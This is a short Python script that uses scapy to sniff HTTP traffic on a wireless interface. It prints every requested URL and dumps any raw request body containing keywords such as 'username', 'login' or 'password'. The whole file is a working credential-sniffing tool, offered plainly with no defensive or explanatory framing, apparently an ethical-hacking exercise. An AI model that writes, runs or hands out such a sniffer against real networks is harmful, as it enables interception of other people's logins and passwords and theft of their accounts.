import scapy.all as scapy
from scapy_http import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "name", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break


sniff("wlan0")